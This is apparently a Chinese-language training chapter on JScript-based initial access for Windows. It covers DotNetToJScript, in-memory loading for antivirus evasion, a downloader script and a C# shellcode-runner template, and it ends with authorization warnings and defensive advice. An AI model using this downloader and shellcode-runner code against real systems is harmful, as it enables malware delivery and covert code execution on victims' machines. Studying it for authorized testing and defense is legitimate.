# JScript攻击 - 新手章节指南

## 这个目录是干什么的？

JScript 是 Windows 内置的脚本语言，可以用来创建恶意脚本文件（.js）。这是另一种常见的初始访问方式。

---

## 为什么要学这个？

```
JScript 的优势：
├── Windows 默认支持，不需要安装任何东西
├── 双击 .js 文件就能执行
├── 可以调用 .NET 框架的功能
├── 比 Office 宏更隐蔽

现实场景：
├── 攻击者发送一个 .js 文件（可能伪装成其他文件）
├── 用户双击运行
├── JScript 代码执行，下载并运行恶意程序
└── 攻击者获得控制权
```

---

## 通俗理解核心概念

### 什么是 JScript？

```
JScript = 微软版的 JavaScript
        = Windows Script Host (WSH) 支持的脚本语言

类比：
├── JavaScript 在浏览器里运行
├── JScript 在 Windows 系统里运行
└── 可以直接操作系统资源

执行方式：
├── 双击 .js 文件
├── 命令行：cscript script.js
└── 命令行：wscript script.js
```

### 什么是 DotNetToJScript？

```
DotNetToJScript = 把 .NET 程序转换成 JScript 的工具

工作原理：
├── 你写一个 C# 程序（比如 Shellcode Runner）
├── DotNetToJScript 把它转换成 JScript 代码
├── JScript 代码可以直接执行你的 C# 程序
└── 不需要把 .exe 文件落地到磁盘

为什么重要？
├── 杀软主要检测 .exe 文件
├── JScript 文件相对不那么可疑
├── 代码在内存中执行，不落地
└── 更难被检测
```

### 什么是反射式加载？

```
反射式加载 = 在内存中直接加载和执行代码

普通加载：
├── 程序保存到磁盘
├── 操作系统加载程序
├── 程序执行
└── 杀软可以扫描磁盘上的文件

反射式加载：
├── 代码直接在内存中
├── 不需要保存到磁盘
├── 直接执行
└── 杀软更难检测

类比：
├── 普通加载 = 把书买回家再看
└── 反射式加载 = 在书店里直接看完
```

## 实践任务清单

### 任务1：写你的第一个 JScript

```javascript
// 保存为 hello.js

// 弹出消息框
WScript.Echo("Hello from JScript!");

// 获取当前用户名
var shell = new ActiveXObject("WScript.Shell");
var username = shell.ExpandEnvironmentStrings("%USERNAME%");
WScript.Echo("当前用户: " + username);

// 双击运行这个文件
```

### 任务2：JScript 执行系统命令

```javascript
// 保存为 cmd.js

var shell = new ActiveXObject("WScript.Shell");

// 执行命令并获取输出
var exec = shell.Exec("cmd /c whoami");

// 等待命令完成
while (exec.Status == 0) {
    WScript.Sleep(100);
}

// 读取输出
var output = exec.StdOut.ReadAll();
WScript.Echo("命令输出: " + output);
```

### 任务3：JScript 下载文件

```javascript
// 保存为 download.js
// 这是一个简单的下载器示例

var url = "http://example.com/test.txt";
var savePath = "C:\\Users\\Public\\test.txt";

// 创建 HTTP 对象
var http = new ActiveXObject("MSXML2.XMLHTTP");
http.Open("GET", url, false);
http.Send();

if (http.Status == 200) {
    // 创建文件流
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Open();
    stream.Type = 1; // 二进制
    stream.Write(http.ResponseBody);
    stream.SaveToFile(savePath, 2); // 2 = 覆盖
    stream.Close();

    WScript.Echo("文件已下载到: " + savePath);
} else {
    WScript.Echo("下载失败: " + http.Status);
}
```

### 任务4：理解 DotNetToJScript 的工作流程

```
DotNetToJScript 工作流程：

1. 编写 C# 类（必须继承特定接口）
   └── 实现一个公共方法作为入口点

2. 编译成 DLL
   └── 使用 Visual Studio 或 csc.exe

3. 使用 DotNetToJScript 转换
   └── DotNetToJScript.exe -o output.js -c ClassName input.dll

4. 生成的 JScript 文件
   └── 包含 Base64 编码的 DLL
   └── 包含反序列化和执行代码

5. 执行 JScript
   └── DLL 在内存中加载
   └── 指定的方法被调用
```

## 核心代码模板

### C# Shellcode Runner 模板

```csharp
// 这是一个可以被 DotNetToJScript 转换的 C# 类
using System;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class ShellcodeRunner
{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public void Run()
    {
        // Shellcode 放这里（用 msfvenom 生成）
        byte[] buf = new byte[] { 0xfc, 0x48, 0x83 };  // 实际使用时替换为完整 shellcode

        // 申请内存
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);

        // 复制 Shellcode
        Marshal.Copy(buf, 0, addr, buf.Length);

        // 创建线程执行
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        // 等待执行
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```

## 安全提醒

```
重要提醒：
├── 只在授权的测试环境中使用
├── 不要对未授权的系统使用
├── 学习目的是理解攻击原理
└── 违法使用会有严重后果

防御建议：
├── 禁用 Windows Script Host（如果不需要）
├── 使用应用白名单阻止 .js 文件执行
├── 部署 EDR 监控脚本执行
└── 培训用户不要运行未知脚本
```
